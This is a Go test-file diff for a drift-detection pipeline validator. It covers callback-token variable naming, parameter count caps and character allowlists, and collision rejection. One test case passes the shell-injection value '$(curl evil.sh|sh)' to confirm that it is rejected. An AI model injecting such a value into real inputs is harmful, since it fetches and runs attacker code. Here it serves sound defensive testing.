@@ -6,6 +6,39 @@ import (
 	"testing"
 )
 
+// TestFanOutCallbackTokenVariableName is the Go half of the Phase 1b item 3
+// equivalence proof (the YAML half is
+// TestFanOutCallbackTokenVariableTemplateExpression_MatchesGoFunction in
+// drift_workflows_test.go): it tables this function over every working_dir
+// shape reWorkingDir permits -- including the empty string, "/" alone,
+// nested paths, dots, hyphens, and leading/trailing separators -- pinning
+// that the transform is exactly "cb_token_" + strings.ReplaceAll(workingDir,
+// "/", "_"), which is what the template's replace(t.working_dir, '/', '_')
+// must also compute (ADO's replace() is documented as an unconditional,
+// all-occurrences substring replace, matching strings.ReplaceAll exactly).
+func TestFanOutCallbackTokenVariableName(t *testing.T) {
+	cases := []struct{ workingDir, want string }{
+		{"", "cb_token_"},
+		{".", "cb_token_."},
+		{"/", "cb_token__"},
+		{"app1", "cb_token_app1"},
+		{"app1/", "cb_token_app1_"},
+		{"/app1", "cb_token__app1"},
+		{"envs/prod/app", "cb_token_envs_prod_app"},
+		{"envs/prod/app/", "cb_token_envs_prod_app_"},
+		{"a.b-c_d", "cb_token_a.b-c_d"},
+		{"team-a/app", "cb_token_team-a_app"},
+		{"a//b", "cb_token_a__b"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.workingDir, func(t *testing.T) {
+			if got := FanOutCallbackTokenVariableName(tc.workingDir); got != tc.want {
+				t.Errorf("FanOutCallbackTokenVariableName(%q) = %q, want %q", tc.workingDir, got, tc.want)
+			}
+		})
+	}
+}
+
 func TestValidatePipelineInputs_Valid(t *testing.T) {
 	cases := []struct {
 		name             string
@@ -51,6 +84,14 @@ func TestValidateDriftTargets_Valid(t *testing.T) {
 			{WorkingDir: "a/"}, {WorkingDir: "b/"}, {WorkingDir: "c/"},
 		}},
 		{name: "exactly the cap", items: makeDriftTargetItems(maxDriftTargets)},
+		{name: "params within the cap and character allowlist", items: []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: map[string]string{
+				"service_connection": "sc-app1", "backend_container": "tfstate.prod", "region-2": "us-east-1",
+			}},
+		}},
+		{name: "params exactly at the cap", items: []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: makeDriftTargetParams(maxDriftTargetParams)},
+		}},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -67,6 +108,16 @@ func makeDriftTargetItems(n int) []DriftTargetItem {
 		items[i] = DriftTargetItem{SourceID: "s1", StateKey: fmt.Sprintf("app%d.tfstate", i), WorkingDir: fmt.Sprintf("app%d/", i)}
 	}
 	return items
+}
+
+// makeDriftTargetParams builds a Params map of exactly n valid entries, for
+// the "at the cap" / "over the cap" pair of TestValidateDriftTargets cases.
+func makeDriftTargetParams(n int) map[string]string {
+	m := make(map[string]string, n)
+	for i := 0; i < n; i++ {
+		m[fmt.Sprintf("key%d", i)] = fmt.Sprintf("value%d", i)
+	}
+	return m
 }
 
 // TestValidateDriftTargets_Rejects pins the three refusals: a per-item
@@ -125,6 +176,49 @@ func TestValidateDriftTargets_Rejects(t *testing.T) {
 		items := []DriftTargetItem{{SourceID: "s1", StateKey: strings.Repeat("k", maxStateKeyLen+1), WorkingDir: "app/"}}
 		if err := validateDriftTargets(items); err == nil {
 			t.Fatal("expected rejection for an over-long state_key")
+		}
+	})
+	// Phase 1b item 3: Params is validated with the same allowlist regex and
+	// count cap every other pipeline input gets.
+	t.Run("too many params", func(t *testing.T) {
+		items := []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: makeDriftTargetParams(maxDriftTargetParams + 1)},
+		}
+		if err := validateDriftTargets(items); err == nil {
+			t.Fatal("expected rejection for exceeding maxDriftTargetParams")
+		}
+	})
+	t.Run("invalid params key", func(t *testing.T) {
+		items := []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: map[string]string{"service connection": "sc-1"}},
+		}
+		if err := validateDriftTargets(items); err == nil {
+			t.Fatal("expected rejection for a params key containing a space")
+		}
+	})
+	t.Run("invalid params value", func(t *testing.T) {
+		items := []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: map[string]string{"service_connection": "$(curl evil.sh|sh)"}},
+		}
+		if err := validateDriftTargets(items); err == nil {
+			t.Fatal("expected rejection for a shell-hostile params value")
+		}
+	})
+	// Phase 1b item 3, the highest-risk part of the change: two targets whose
+	// working_dir derive the SAME Azure DevOps callback-token variable name
+	// must be refused, not silently dispatched -- a collision there would
+	// hand one app's one-shot callback token to the other app's report step.
+	t.Run("two targets derive the same callback-token variable name", func(t *testing.T) {
+		items := []DriftTargetItem{
+			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "a/b"},
+			{SourceID: "s2", StateKey: "app2.tfstate", WorkingDir: "a_b"},
+		}
+		err := validateDriftTargets(items)
+		if err == nil {
+			t.Fatal("expected rejection for two targets deriving the same callback-token variable name")
+		}
+		if !strings.Contains(err.Error(), "cb_token_a_b") {
+			t.Errorf("error should name the colliding variable: %v", err)
 		}
 	})
 }
